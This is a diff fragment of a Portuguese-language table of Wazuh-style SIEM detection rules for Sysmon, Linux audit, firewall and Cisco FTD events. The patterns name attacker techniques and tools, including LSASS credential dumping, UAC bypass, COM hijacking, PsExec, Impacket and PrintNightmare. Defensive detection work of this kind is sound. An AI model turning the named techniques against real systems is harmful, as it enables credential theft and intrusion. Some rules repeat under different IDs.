+| Sysmon | Atividade suspeita de DCOM/RPC do processo PowerShell | Security | Detecta uso do PowerShell para executar comandos remotos via DCOM/RPC, possível vetor lateral de movimentação. | <rule id="11001" level="10"> <if_sid>4104</if_sid> <field name="win.eventdata.scriptBlockText">DCOM</field> <description>PowerShell com atividade DCOM/RPC suspeita.</description> </rule> | Investigar origem da execução. Restringir uso de DCOM/RPC via PowerShell. |
+| Sysmon | Atividade LDAP do processo PowerShell, possível descoberta remota de sistema | Security | Detecta comandos de enumeração LDAP executados por PowerShell, geralmente usados para descobrir ativos na rede. | <rule id="11002" level="10"> <if_sid>4104</if_sid> <field name="win.eventdata.scriptBlockText">LDAP://</field> <description>PowerShell com comandos de enumeração LDAP.</description> </rule> | Monitorar comandos, restringir execução de scripts desconhecidos. |
+| Sysmon | Binário suspeito criado conectando-se à rede com $(win.eventdata.destinationIp):$(win.eventdata.destinationPort) | Security | Detecta binário gerando tráfego de rede suspeito, possível malware ou beacon. | <rule id="11003" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.destinationPort">.*</field> <description>Binário gerando tráfego de rede suspeito.</description> </rule> | Analisar o binário, aplicar bloqueios por reputação/IP. |
+| Sysmon | Acesso suspeito aos compartilhamentos administrativos do Windows | Security | Detecta acesso não autorizado aos compartilhamentos como ADMIN$, C$, etc. | <rule id="11004" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.shareName">ADMIN$</field> <description>Acesso suspeito aos compartilhamentos administrativos.</description> </rule> | Aplicar segmentação de rede e autenticação forte. |
+| Sysmon | Atividade do processo do sistema do Windows via porta SMB - Possível acesso suspeito aos compartilhamentos administrativos do Windows | Security | Detecta uso de SMB por processos inesperados para acessar recursos administrativos. | <rule id="11005" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.destinationPort">445</field> <description>Uso anômalo da porta SMB.</description> </rule> | Restringir portas SMB para usuários e processos não autorizados. |
+| Sysmon | Script gerou atividade suspeita na rede via protocolo TCP | Security | Detecta script executando conexão TCP, sinal potencial de beaconing ou C2. | <rule id="11006" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.image">powershell.exe</field> <description>Script gerou tráfego de rede suspeito via TCP.</description> </rule> | Monitorar IPs de destino e comportamento do script. |
+| Sysmon | Atividade de rede detectada via porta RDP de $(win.eventdata.sourceIp) para $(win.eventdata.destinationIp) | Security | Detecta uso de RDP a partir de hosts incomuns ou automatizados. | <rule id="11007" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.destinationPort">3389</field> <description>Atividade de rede via RDP suspeita.</description> </rule> | Investigar origens, aplicar MFA e lista de controle de acesso. |
+| Sysmon | Atividade de rede via porta RDP de endereço de loopback, possível exploração usando túnel reverso | Security | Detecta conexões RDP locais usando 127.0.0.1 como destino. | <rule id="11008" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.destinationIp">127.0.0.1</field> <description>Uso de loopback em conexão RDP.</description> </rule> | Verificar se há túnel reverso ativo e processos associados. |
+| Sysmon | Atividade de WinRM detectada de $(win.eventdata.sourceIp) para $(win.eventdata.destinationIp) | Security | Detecta uso de WinRM entre máquinas, vetor comum de movimentação lateral. | <rule id="11009" level="10"> <if_sid>3</if_sid> <field name="win.eventdata.destinationPort">5985</field> <description>Conexão suspeita via WinRM.</description> </rule> | Verificar se máquinas deveriam se comunicar via WinRM. |
+| Sysmon | Binário carregou biblioteca de automação PowerShell - Possível execução não gerenciada do PowerShell por processo suspeito | Security | Detecta uso de DLLs de automação do PowerShell fora de contexto normal. | <rule id="11010" level="10"> <if_sid>7</if_sid> <field name="win.eventdata.imageLoaded">System.Management.Automation.dll</field> <description>DLL de automação PowerShell carregada por processo suspeito.</description> </rule> | Verificar processo pai, restringir uso externo do PowerShell. |
+| Sysmon | Serviço de spooler de impressora carregou um arquivo DLL. Possível exploração do PrintNightmare: CVE-2021-34527 | Security | Detecta tentativa de exploração do PrintNightmare via spoolsv.exe. | <rule id="11011" level="12"> <if_sid>7</if_sid> <field name="win.eventdata.image">spoolsv.exe</field> <description>Spooler carregou DLL – possível CVE-2021-34527.</description> </rule> | Atualizar patches, monitorar atividade do spoolsv.exe. |
+| Sysmon | Processo suspeito carregou o módulo VaultCli.dll. Possível uso para despejar senhas armazenadas. | Security | Detecta tentativa de acesso ao Gerenciador de Credenciais via DLL. | <rule id="11012" level="12"> <if_sid>7</if_sid> <field name="win.eventdata.imageLoaded">VaultCli.dll</field> <description>VaultCli.dll carregado por processo suspeito.</description> </rule> | Bloquear ferramentas não autorizadas, monitorar acessos. |
+| Sysmon | Processo carregou o módulo taskschd.dll. Pode ser usado para criar execução atrasada de malware | Security | Detecta abuso da DLL do Agendador de Tarefas do Windows para persistência. | <rule id="11013" level="10"> <if_sid>7</if_sid> <field name="win.eventdata.imageLoaded">taskschd.dll</field> <description>taskschd.dll carregada por processo incomum.</description> </rule> | Verificar persistência e agendamentos novos. |
+| Sysmon | Mshta carregou o módulo taskschd.dll. Pode ser usado para criar execução atrasada de malware | Security | Detecta uso de mshta.exe com DLLs de agendamento, vetor comum de malware. | <rule id="11014" level="12"> <if_sid>7</if_sid> <field name="win.eventdata.image">mshta.exe</field> <description>mshta.exe com DLL de agendamento.</description> </rule> | Bloquear mshta onde não for necessário. |
+| Sysmon | Aplicativo Office carregou o módulo vbeui.dll. Pode ser usado para executar código de script | Security | Detecta macros do Office ativando execução de script via vbeui.dll. | <rule id="11015" level="10"> <if_sid>7</if_sid> <field name="win.eventdata.imageLoaded">vbeui.dll</field> <description>Office carregando vbeui.dll – possível macro maliciosa.</description> </rule> | Desabilitar macros e alertar sobre execuções suspeitas. |
+| Sysmon | Um executável - $(win.eventdata.image) - carregou $(win.eventdata.imageLoaded) do diretório Temp | Security | Detecta binários carregando DLLs da pasta Temp – comportamento anômalo. | <rule id="11016" level="10"> <if_sid>7</if_sid> <field name="win.eventdata.imageLoaded">.*Temp.*</field> <description>DLL carregada de diretório Temp.</description> </rule> | Investigar origem e assinatura digital do binário. |
+| Sysmon | Arquivo de script criado na pasta Temp ou de usuário do Windows | Change | Detecta criação de arquivos .ps1/.vbs/.js em locais suspeitos. | <rule id="11017" level="8"> <if_sid>11</if_sid> <field name="win.eventdata.targetFilename">.*\\Temp\\.*</field> <description>Script criado em pasta temporária.</description> </rule> | Aplicar controles de escrita por usuário e monitorar alterações. |
+| Sysmon | $(win.eventdata.image) criou um novo arquivo de script na pasta Temp ou de dados de usuário do Windows | Change | Detecta processo criando scripts em local temporário, potencial vetor de execução maliciosa. | <rule id="11018" level="8"> <if_sid>11</if_sid> <field name="win.eventdata.targetFilename">.*\\Users\\.*\\Temp.*</field> <description>Criação de script por processo suspeito.</description> </rule> | Aplicar monitoramento em tempo real e resposta a IOC. |
+| Sysmon | Executável foi criado na pasta raiz do Windows pelo processo $(win.eventdata.image). Possível abuso de compartilhamentos administrativos do Windows | Security | Detecta criação de executáveis em C:\ por processos remotos. | <rule id="11019" level="12"> <if_sid>11</if_sid> <field name="win.eventdata.targetFilename">C:\\.*\.exe</field> <description>Criação de executável na raiz do sistema.</description> </rule> | Auditar compartilhamentos administrativos. |
+| Sysmon | Arquivo executável criado pelo PowerShell: $(win.eventdata.targetFilename) | Security | Detecta scripts PowerShell que geram binários executáveis, sinal comum de malware. | <rule id="11020" level="12"> <if_sid>11</if_sid> <field name="win.eventdata.image">powershell.exe</field> <description>PowerShell criando binário executável.</description> </rule> | Restringir permissões de gravação e execução. |
+| Sysmon | Processo PowerShell criou arquivo executável na pasta temporária do AppData | Security | Detecta escrita de binários em local privilegiado via PowerShell. | <rule id="11021" level="12"> <if_sid>11</if_sid> <field name="win.eventdata.targetFilename">.*\\AppData\\Local\\Temp.*\.exe</field> <description>Binário criado por PowerShell no AppData.</description> </rule> | Bloquear execução em caminhos temporários e revisar políticas. |
+| Sysmon | Novo serviço do Windows criado para iniciar da pasta raiz do Windows | Security | Detecta criação de serviço que inicia a partir da raiz do sistema, indicando possível uso de compartilhamentos administrativos por malware. | <rule id="10001" level="10"> <if_sid>61601</if_sid> <field name="win.system.providerName">Service Control Manager</field> <field name="win.eventdata.imagePath">C:\*</field> <description>Novo serviço criado a partir da raiz do Windows</description> </rule> | Investigar o serviço criado, verificar origem do binário e reforçar controle sobre compartilhamentos administrativos. |
+| Sysmon | Logon remoto bem-sucedido pelo usuário | Security | Detecta logons remotos que podem indicar acesso lateral, uso indevido de credenciais ou administração remota. | <rule id="10002" level="7"> <if_sid>61602</if_sid> <field name="win.eventdata.ipAddress">*</field> <description>Logon remoto bem-sucedido pelo usuário</description> </rule> | Validar IPs remotos, cruzar com horário e atividades, e aplicar MFA para acessos externos. |
+| Sysmon | Logon remoto com autenticação NTLM | Security | Autenticação NTLM em logons remotos pode indicar ataque pass-the-hash. | <rule id="10003" level="10"> <if_sid>61603</if_sid> <field name="win.eventdata.authenticationPackageName">NTLM</field> <description>Logon remoto via NTLM</description> </rule> | Desabilitar NTLM sempre que possível e reforçar auditoria de credenciais privilegiadas. |
+| Sysmon | Login via RDP com IP externo | Security | Detecta acesso via RDP com IP externo, comum em casos de brute-force ou exploração via credenciais vazadas. | <rule id="10004" level="10"> <if_sid>61604</if_sid> <field name="win.eventdata.logonType">10</field> <description>Login via RDP com IP externo</description> </rule> | Restringir RDP por firewall, usar VPN, habilitar alertas de falha de logon e aplicar MFA. |
+| Sysmon | Consulta WMI para inventário de sistema | Recon | Detecta tentativa de mapeamento de sistema via WMI, técnica comum em movimentação lateral. | <rule id="10005" level="7"> <if_sid>61605</if_sid> <field name="win.eventdata.query">Select * from Win32_*</field> <description>Consulta WMI suspeita</description> </rule> | Investigar origem da consulta e correlacionar com outros sinais de enumeração ou lateral movement. |
+| Sysmon | Erro no driver de impressora - possível PrinterNightmare | Security | Falha ao carregar driver de impressora pode ser indicativo de exploração CVE-2021-34527. | <rule id="10006" level="10"> <if_sid>61606</if_sid> <field name="win.eventdata.eventID">808</field> <description>Possível exploração PrinterNightmare</description> </rule> | Desabilitar spooler quando não necessário e aplicar patch do CVE-2021-34527. |
+| Sysmon | Login via RDP usando endereço de loopback | Security | Indicador de uso de túnel reverso, possivelmente após uso de credenciais roubadas. | <rule id="10007" level="10"> <if_sid>61607</if_sid> <field name="win.eventdata.ipAddress">127.0.0.1</field> <description>Login RDP via loopback</description> </rule> | Verificar se há túnel reverso ativo e revisar segurança de contas com histórico de uso RDP. |
+| Sysmon | Conexão RDP com NTLM suspeita + workstationName | Security | Combinação de logon via NTLM e workstationName pode indicar ataque lateral ou sequestro de sessão RDP. | <rule id="10008" level="9"> <if_sid>61608</if_sid> <field name="win.eventdata.authenticationPackageName">NTLM</field> <field name="win.eventdata.workstationName">*</field> <description>Possível uso indevido de RDP com NTLM</description> </rule> | Auditar sessões RDP abertas, revisar contas de serviço e aplicar segmentação de rede. |
+| Audit | Script Python executado | Security | Execução de script Python pode indicar automação, testes ou movimento lateral em ambientes Linux. | <rule id="10009" level="7"> <if_sid>61609</if_sid> <field name="audit.process.name">python</field> <description>Script Python executado</description> </rule> | Revisar contexto do script, validar usuários e restringir execução remota não autorizada. |
+| Audit | Script Python executado da pasta /tmp/ | Security | Scripts em /tmp são frequentemente usados por malware por serem áreas temporárias e sem restrição. | <rule id="10010" level="9"> <if_sid>61610</if_sid> <field name="audit.process.path">/tmp/*</field> <description>Python executado de /tmp</description> </rule> | Monitorar scripts em áreas temporárias, configurar AppArmor/SELinux e criar alertas proativos. |
+| Audit | Script Python semelhante ao Impacket | Security | Detecta padrões conhecidos de ferramentas de pentest como Impacket. | <rule id="10011" level="10"> <if_sid>61611</if_sid> <field name="audit.command">impacket*</field> <description>Assinatura de Impacket</description> </rule> | Investigar origem do script, bloquear lateral movement e reforçar segmentação da rede. |
+| Audit | Arquivo copiado via SCP | Recon | Transferência de arquivos por SCP pode indicar movimentação lateral ou exfiltração. | <rule id="10012" level="7"> <if_sid>61612</if_sid> <field name="audit.process.name">scp</field> <description>Transferência de arquivo via SCP</description> </rule> | Monitorar transferências SCP entre hosts internos e aplicar controle de tráfego SSH. |
+| Audit | Execução do comando ps | Recon | Listagem de processos pode indicar coleta de informações por atacante. | <rule id="10013" level="6"> <if_sid>61613</if_sid> <field name="audit.command">ps aux</field> <description>Consulta de processos suspeita</description> </rule> | Validar origem do comando e rastrear atividade do usuário no tempo. |
+| Audit | Execução do comando ls recursivo | Recon | Comando `ls -R` pode indicar enumeração agressiva de arquivos e diretórios. | <rule id="10014" level="6"> <if_sid>61614</if_sid> <field name="audit.command">ls -R</field> <description>Enumeração de arquivos via ls</description> </rule> | Verificar shell/script que executou a consulta e analisar objetivo da ação. |
+| Audit | Uso do PsExec via CMD | Lateral Movement | Uso do PsExec é comum em movimentações laterais por atacantes. | <rule id="10015" level="9"> <if_sid>61615</if_sid> <field name="audit.command">PsExec.exe</field> <description>Execução de PsExec</description> </rule> | Bloquear PsExec via políticas de aplicação e auditar uso em estações críticas. |
+| Audit | Uso do Nmap detectado | Recon | Detecta scanner de rede. Possível reconhecimento pré-ataque. | <rule id="10016" level="7"> <if_sid>61616</if_sid> <field name="audit.command">nmap</field> <description>Uso de Nmap</description> </rule> | Correlacionar com tráfego de rede e revisar logs para determinar objetivo do escaneamento. |
+| Sysmon | Registro modificado para execução no próximo logon | Persistence | Entrada no registro pode garantir persistência para malware ou ferramentas remotas. | <rule id="10017" level="9"> <if_sid>61617</if_sid> <field name="win.eventdata.targetObject">*Run*</field> <description>Persistência via registro</description> </rule> | Auditar entradas Run e RunOnce, validar integridade de chaves e bloquear executáveis suspeitos. |
+| Sysmon | Extensão de arquivo incomum em chave de inicialização | Persistence | Uso de extensões incomuns em chaves de registro pode indicar evasão de detecção. | <rule id="10018" level="8"> <if_sid>61618</if_sid> <field name="win.eventdata.targetObject">*.jpg</field> <description>Extensão incomum em inicialização</description> </rule> | Verificar conteúdo real do arquivo e impedir execução de extensões não autorizadas. |
+| Sysmon | Entrada no registro alterada via reg.exe | Persistence | Modificação de chave de inicialização usando reg.exe pode indicar script automatizado ou malware. | <rule id="10019" level="8"> <if_sid>61619</if_sid> <field name="win.eventdata.image">reg.exe</field> <description>Modificação de chave de inicialização via reg.exe</description> </rule> | Auditar comandos com reg.exe e revisar contexto do processo pai. |
+| Sysmon | Registro aponta para ferramenta de acesso remoto | Persistence | Entradas do registro que executam ferramentas como TeamViewer, AnyDesk, etc. podem ser suspeitas. | <rule id="10020" level="9"> <if_sid>61620</if_sid> <field name="win.eventdata.details">AnyDesk</field> <description>Persistência via ferramenta de acesso remoto</description> </rule> | Validar uso autorizado da ferramenta e revisar logs de acesso remoto. |
+| Sysmon | Chave de registro modificada associada ao bypass de UAC por processos autoelevados | Security | Detecta modificações suspeitas em chaves de registro que indicam tentativas de bypass de UAC por elevação de privilégio automatizada | <rule id="20010" level="10"> <if_sid>61600</if_sid> <field name="win.eventdata.targetObject">.*(uac)|(elevation)</field> <description>Chave de registro suspeita modificada para bypass de UAC</description> </rule> | Verificar a origem do processo responsável e aplicar política de bloqueio para alterações não autorizadas nas chaves de execução automática. |
+| Sysmon | Interpretador de comandos adicionado à chave do registro associada ao bypass de UAC por processos autoelevados | Security | Uso de cmd.exe ou powershell.exe em chaves do registro que iniciam com privilégios elevados pode indicar persistência ou escalonamento de privilégio | <rule id="20011" level="12"> <if_sid>61600</if_sid> <field name="win.eventdata.details">.*(cmd\.exe|powershell\.exe)</field> <description>Adição de interpretador de comandos em chave de registro com privilégios elevados</description> </rule> | Revisar o autor da modificação, bloquear execução automática, e aplicar hardening das permissões do registro. |
+| Sysmon | $(win.eventdata.image) adicionado ao registro uma subchave associada ao bypass de UAC por processos autoelevados | Security | Identifica programas adicionando entradas de inicialização automática com privilégios elevados | <rule id="20012" level="10"> <if_sid>61600</if_sid> <field name="win.eventdata.image">.*</field> <description>Programa adicionado a subchave de inicialização com bypass UAC</description> </rule> | Investigar qual aplicação fez a modificação e se corresponde a atividade legítima. |
+| Sysmon | Evidência de criação de novo serviço encontrada no registro sob $(win.eventdata.targetObject) o binário é: $(win.eventdata.details). | Security | Detecta criação de serviços via modificação de chaves de registro, comum em ataques de persistência | <rule id="20013" level="11"> <if_sid>61600</if_sid> <field name="win.eventdata.targetObject">.*\\Services\\.*</field> <description>Criação de serviço no registro</description> </rule> | Verificar se o serviço é autorizado e validar integridade do binário indicado. |
+| Sysmon | Possível evidência de Hijacking de COM encontrada no registro sob $(win.eventdata.targetObject) o binário é: $(win.eventdata.details). | Security | Detecta possível persistência por meio de COM hijacking através de manipulação de CLSID | <rule id="20014" level="12"> <if_sid>61600</if_sid> <field name="win.eventdata.targetObject">.*CLSID.*</field> <description>Suspeita de COM hijacking via modificação no registro</description> </rule> | Auditar atividade do usuário e impedir alteração indevida de entradas CLSID. |
+| Sysmon | Evidência de Hijacking de COM encontrada no registro sob $(win.eventdata.targetObject) binário suspeito é: $(win.eventdata.details). | Security | Confirma manipulação de CLSID com caminho para binários não autorizados, indicando persistência ou execução maliciosa | <rule id="20015" level="13"> <if_sid>61600</if_sid> <field name="win.eventdata.details">.*(AppData|Temp|Downloads).*\.exe</field> <description>COM Hijacking confirmado com binário não confiável</description> </rule> | Isolar o host e remover entrada de registro maliciosa; aplicar GPOs que previnam modificações em CLSID. |
+| Sysmon | Possível injeção de código no explorer.exe por $(win.eventdata.sourceImage). | Security | Detecta tentativa de injeção no processo do Windows Explorer, uma técnica comum para execução encoberta | <rule id="20016" level="13"> <if_sid>61700</if_sid> <field name="win.eventdata.targetImage">.*explorer.exe</field> <description>Injeção detectada no explorer.exe</description> </rule> | Investigar se o processo injetor é legítimo; considerar bloqueio via AppLocker ou WDAC. |
+| Sysmon | Possível injeção de código no mstsc.exe (utilitário RDP do Windows) por $(win.eventdata.sourceImage). | Security | Detecta tentativa de injeção no Remote Desktop Client, possível ataque de coleta de credenciais | <rule id="20017" level="14"> <if_sid>61700</if_sid> <field name="win.eventdata.targetImage">.*mstsc.exe</field> <description>Injeção no mstsc.exe detectada</description> </rule> | Validar se houve conexão remota em paralelo; revisar origem do processo injetor. |
+| Sysmon | Possível injeção de código por $(win.eventdata.sourceImage) em $(win.eventdata.targetImage). | Security | Gatilho genérico para detecção de injeções entre processos | <rule id="20018" level="12"> <if_sid>61700</if_sid> <field name="win.eventdata.sourceImage">.*</field> <description>Injeção de processo detectada</description> </rule> | Analisar relação entre processos; considerar isolamento e uso de EDR para rastrear cadeia de execução. |
+| Sysmon | Processo Local Security Authority Subsystem Service (LSASS) foi acessado por $(win.eventdata.sourceImage), possível injeção de código para despejo de credenciais. | Security | Detecta acesso ao LSASS, comum em ataques de credential dumping como mimikatz | <rule id="20019" level="15"> <if_sid>61700</if_sid> <field name="win.eventdata.targetImage">.*lsass.exe</field> <description>Possível tentativa de dump de credenciais via LSASS</description> </rule> | Isolar host imediatamente; aplicar medidas de proteção como Credential Guard e EDR. |
+| Firewall | Pacote bloqueado pela regra default drop do firewall | Disponibilidade | Identifica pacotes descartados por padrão no firewall, o que pode indicar falhas de comunicação ou tentativas não autorizadas | <rule id="30001" level="5"> <if_sid>65001</if_sid> <field name="firewall.message">.*default drop.*</field> <description>Firewall descartou pacote pela regra padrão</description> </rule> | Validar origem e destino do tráfego, ajustar políticas se necessário ou aplicar regra mais específica. |
+| Firewall | Conexão SSH detectada na porta $(firewall.destination_port), origem $(firewall.src_ip); destino $(firewall.dst_ip). | Security | Monitoramento de conexões SSH, útil para detectar acessos externos não autorizados | <rule id="30002" level="7"> <if_sid>65001</if_sid> <field name="firewall.destination_port">22</field> <description>Conexão SSH detectada</description> </rule> | Validar origem, horário e destino; aplicar regras de geobloqueio ou whitelist se necessário. |
+| Firewall | Conexão RDP detectada na porta $(firewall.destination_port), origem $(firewall.src_ip); destino $(firewall.dst_ip). | Security | Detecta tentativa de conexão via RDP, o que pode ser normal ou indicativo de ataque de força bruta | <rule id="30003" level="7"> <if_sid>65001</if_sid> <field name="firewall.destination_port">3389</field> <description>Conexão RDP detectada</description> </rule> | Verificar se origem é confiável, habilitar autenticação MFA, auditar acessos. |
+| Firewall | Tentativa de conexão à porta $(firewall.destination_port) fora do horário comercial | Change | Conexão não usual fora do expediente, pode indicar automação mal configurada ou movimentação lateral | <rule id="30004" level="6"> <if_sid>65001</if_sid> <field name="firewall.timestamp">.*(00:00|23:.*|.*-.*)</field> <description>Conexão fora do horário comercial</description> </rule> | Confirmar se é comportamento esperado, bloquear origem se suspeita. |
+| Cisco FTD | Alerta de IPS para assinatura: $(cisco.event.signature) origem $(cisco.src_ip) destino $(cisco.dst_ip); porta $(cisco.dst_port) | ;Security | Detecta eventos críticos gerados pelo IPS do Cisco FTD com base em assinaturas conhecidas | <rule id="40001" level="10"> <if_sid>67001</if_sid> <field name="cisco.event.signature">.*</field> <description>Alerta de IPS Cisco</description> </rule> | Confirmar criticidade da assinatura, verificar logs do endpoint e origem do tráfego. |
+| Cisco FTD | Tentativa de exploração bloqueada pela política de proteção da Cisco FTD | Security | Indica que uma tentativa de ataque conhecida foi interceptada e bloqueada | <rule id="40002" level="12"> <if_sid>67001</if_sid> <field name="cisco.event.action">blocked</field> <description>Exploração bloqueada pela Cisco FTD</description> </rule> | Validar atualização da assinatura, revisar segmentação de rede e escopo do bloqueio. |
+| Cisco FTD | Evento de acesso permitido após verificação de política por $(cisco.user) | ;Security | Eventos permitidos apesar de regra configurada, pode indicar exceções ou brechas na política | <rule id="40003" level="6"> <if_sid>67001</if_sid> <field name="cisco.event.action">allowed</field> <description>Acesso permitido por política do Cisco FTD</description> </rule> | Revisar políticas de exceção, confirmar se o usuário está autorizado. |
+| Cisco FTD | Fluxo de dados anômalo detectado com mais de 10000 pacotes para $(cisco.dst_ip) porta $(cisco.dst_port) | ;Performance | Indica comunicação intensa que pode impactar desempenho ou ser indício de exfiltração | <rule id="40004" level="9"> <if_sid>67001</if_sid> <field name="cisco.event.bytes">[1-9][0-9]{4,}</field> <description>Tráfego anômalo Cisco FTD</description> </rule> | Confirmar tipo de aplicação; usar QoS e limitar taxa de envio; verificar se há upload não autorizado. |
+| Cisco FTD | Acesso externo ao IP público $(cisco.dst_ip) foi registrado | Security | Detecta acessos vindos da internet para IPs expostos | <rule id="40005" level="8"> <if_sid>67001</if_sid> <field name="cisco.src_ip">.*</field> <field name="cisco.dst_ip">.*public.*</field> <description>Acesso externo detectado</description> </rule> | Revisar exposição dos serviços e restringir acessos externos via ACL ou VPN. |
+| Sysmon | Chave de registro modificada associada ao bypass de UAC por processos autoelevados | Security | Detecta alterações no registro relacionadas a bypass de Controle de Conta de Usuário (UAC) por processos que executam com privilégios elevados automaticamente, possível atividade maliciosa de elevação de privilégios. | <rule id="11022" level="12"> <if_sid>13</if_sid> <field name="win.eventdata.targetObject">.*UAC.*</field> <description>Bypass de UAC detectado por modificação no registro.</description> </rule> | Monitorar alterações no registro, restringir privilégios de execução e validar assinaturas digitais. |
+| Sysmon | Interpretador de comandos adicionado à chave do registro associada ao bypass de UAC por processos autoelevados | Security | Detecta inclusão de interpretadores de comando no registro de bypass de UAC, indicando possível execução de comandos maliciosos com elevação. | <rule id="11023" level="12"> <if_sid>13</if_sid> <field name="win.eventdata.details">.*cmd.exe|powershell.exe.*</field> <description>Interpretador de comando adicionado no bypass de UAC.</description> </rule> | Bloquear alterações indevidas no registro e monitorar execução de scripts suspeitos. |
+| Sysmon | $(win.eventdata.image) adicionado ao registro uma subchave associada ao bypass de UAC por processos autoelevados | Security | Detecta processos que adicionam entradas no registro para persistência com bypass de UAC, possível técnica de malware. | <rule id="11024" level="12"> <if_sid>13</if_sid> <field name="win.eventdata.image">.*</field> <description>Subchave adicionada ao registro para bypass de UAC.</description> </rule> | Auditar processos que modificam registro, alertar alterações suspeitas. |
+| Sysmon | Evidência de criação de novo serviço encontrada no registro sob $(win.eventdata.targetObject) o binário é: $(win.eventdata.details). | Security | Detecta criação de serviço do Windows via registro, que pode ser legítimo ou usado por malware para persistência. | <rule id="11025" level="10"> <if_sid>13</if_sid> <field name="win.eventdata.targetObject">.*services.*</field> <description>Criação de novo serviço detectada no registro.</description> </rule> | Validar serviço criado, revisar permissões e origem do binário. |
+| Sysmon | Possível evidência de Hijacking de COM encontrada no registro sob $(win.eventdata.targetObject) o binário é: $(win.eventdata.details). | Security | Detecta manipulação de entradas COM no registro, técnica usada para injeção e persistência maliciosa. | <rule id="11026" level="12"> <if_sid>13</if_sid> <field name="win.eventdata.targetObject">.*COM.*</field> <description>Hijacking de COM detectado no registro.</description> </rule> | Investigar alterações, bloquear processos suspeitos. |
+| Sysmon | Evidência de Hijacking de COM encontrada no registro sob $(win.eventdata.targetObject) binário suspeito é: $(win.eventdata.details). | Security | Detecta entradas COM com binários não confiáveis, indicativo de malware tentando controle de componentes. | <rule id="11027" level="12"> <if_sid>13</if_sid> <field name="win.eventdata.details">.*suspeito.*</field> <description>Hijacking de COM com binário suspeito.</description> </rule> | Revisar assinaturas dos binários, alertar equipe de segurança. |
+| Sysmon | Possível injeção de código no explorer.exe por $(win.eventdata.sourceImage). | Security | Detecta processos que tentam injetar código dentro do processo explorer.exe, técnica usada para persistência e evasão. | <rule id="11028" level="12"> <if_sid>8</if_sid> <field name="win.eventdata.targetImage">explorer.exe</field> <description>Injeção de código detectada em explorer.exe.</description> </rule> | Monitorar processos e suas injeções, bloquear ferramentas suspeitas. |
+| Sysmon | Possível injeção de código no mstsc.exe (utilitário RDP do Windows) por $(win.eventdata.sourceImage). | Security | Detecta tentativa de injeção de código no mstsc.exe, pode indicar manipulação de sessão RDP. | <rule id="11029" level="12"> <if_sid>8</if_sid> <field name="win.eventdata.targetImage">mstsc.exe</field> <description>Injeção de código detectada em mstsc.exe.</description> </rule> | Auditar conexões RDP e processos associados. |
+| Sysmon | Possível injeção de código por $(win.eventdata.sourceImage) em $(win.eventdata.targetImage). | Security | Detecta injeção de código genérica entre processos, indício forte de atividade maliciosa. | <rule id="11030" level="12"> <if_sid>8</if_sid> <field name="win.eventdata.sourceImage">.*</field> <field name="win.eventdata.targetImage">.*</field> <description>Injeção de código entre processos detectada.</description> </rule> | Implementar monitoramento e bloqueio de injeção de código. |
+| Sysmon | Processo Local Security Authority Subsystem Service (LSASS) foi acessado por $(win.eventdata.sourceImage), possível injeção de código para despejo de credenciais. | Security | Detecta acesso ao processo LSASS, que pode indicar tentativa de roubo de credenciais por injeção ou leitura direta. | <rule id="11031" level="15"> <if_sid>8</if_sid> <field name="win.eventdata.targetImage">lsass.exe</field> <description>Acesso suspeito ao processo LSASS detectado.</description> </rule> | Restringir acesso ao LSASS, aplicar proteção de memória e alertar atividade suspeita. |
+| Cisco FTD | FTD: falha na autenticação AAA (VPN). | Security | Detecta falhas de autenticação em conexões VPN via AAA no Cisco FTD, podendo indicar tentativa de acesso não autorizado. | <rule id="20001" level="10"><if_sid>91000</if_sid><field name="data.message">.*AAA authentication failed.*</field><description>FTD: falha na autenticação AAA (VPN)</description></rule> | Investigar o IP de origem e usuário; implementar bloqueios após tentativas consecutivas. |
+| Cisco FTD | FTD: autenticação AAA (VPN) bem-sucedida. | Security | Detecta autenticações bem-sucedidas em VPN via AAA, útil para correlação com falhas anteriores. | <rule id="20002" level="5"><if_sid>91000</if_sid><field name="data.message">.*AAA authentication successful.*</field><description>FTD: autenticação AAA (VPN) bem-sucedida</description></rule> | Correlacionar com tentativas anteriores e confirmar se o usuário é autorizado. |
+| Cisco FTD | FTD: usuário bloqueado na autenticação AAA (VPN). | Security | Indica bloqueio automático do usuário após falhas de autenticação, importante para detecção de brute force. | <rule id="20003" level="8"><if_sid>91000</if_sid><field name="data.message">.*AAA user locked.*</field><description>FTD: usuário bloqueado na autenticação AAA</description></rule> | Verificar políticas de bloqueio e ajustar thresholds se necessário. |
+| Cisco FTD | FTD: Desabilitando novas conexões. | Availability | Indica que o FTD parou de aceitar novas conexões, podendo indicar manutenção ou falha. | <rule id="20004" level="7"><if_sid>91000</if_sid><field name="data.message">.*Disabling new connections.*</field><description>FTD: Desabilitando novas conexões</description></rule> | Confirmar contexto da ação e verificar logs de saúde do dispositivo. |
+| Cisco FTD | FTD: problema de comunicação do par de failover do firewall. | Availability | Detecta falha de comunicação entre pares de failover, o que pode indicar risco de indisponibilidade. | <rule id="20005" level="9"><if_sid>91000</if_sid><field name="data.message">.*failover.*communication.*error.*</field><description>Problema de comunicação no failover FTD</description></rule> | Verificar conectividade entre pares e status das interfaces heartbeat. |
+| Cisco FTD | FTD: Configuração do firewall excluída. | Change | Alerta sobre deleção de configuração crítica no firewall, possível ação maliciosa ou erro administrativo. | <rule id="20006" level="9"><if_sid>91000</if_sid><field name="data.message">.*configuration.*deleted.*</field><description>Configuração do firewall excluída</description></rule> | Validar autor da ação e restaurar backup de configuração se necessário. |
+| Cisco FTD | FTD: Configuração do firewall alterada. | Change | Detecta alteração na configuração do firewall. Importante para rastreabilidade de mudanças. | <rule id="20007" level="6"><if_sid>91000</if_sid><field name="data.message">.*configuration.*changed.*</field><description>Configuração do firewall alterada</description></rule> | Validar logs de auditoria e aplicar controle de mudanças com dupla checagem. |
+| Cisco FTD | FTD: Comando de firewall executado (somente para contabilidade). | Audit | Audita comandos executados manualmente no FTD, útil para revisão de ações administrativas. | <rule id="20008" level="3"><if_sid>91000</if_sid><field name="data.message">.*Command executed.*</field><description>Comando de firewall executado</description></rule> | Manter controle de acesso baseado em função (RBAC) e logs detalhados ativados. |
+| Cisco FTD | FTD: Usuário criado ou modificado no firewall. | Change | Alerta sobre criação ou modificação de conta de usuário no firewall. | <rule id="20009" level="9"><if_sid>91000</if_sid><field name="data.message">.*user.*(created|modified).*</field><description>Usuário criado ou modificado no firewall</description></rule> | Validar origem da alteração e exigir autenticação forte. |
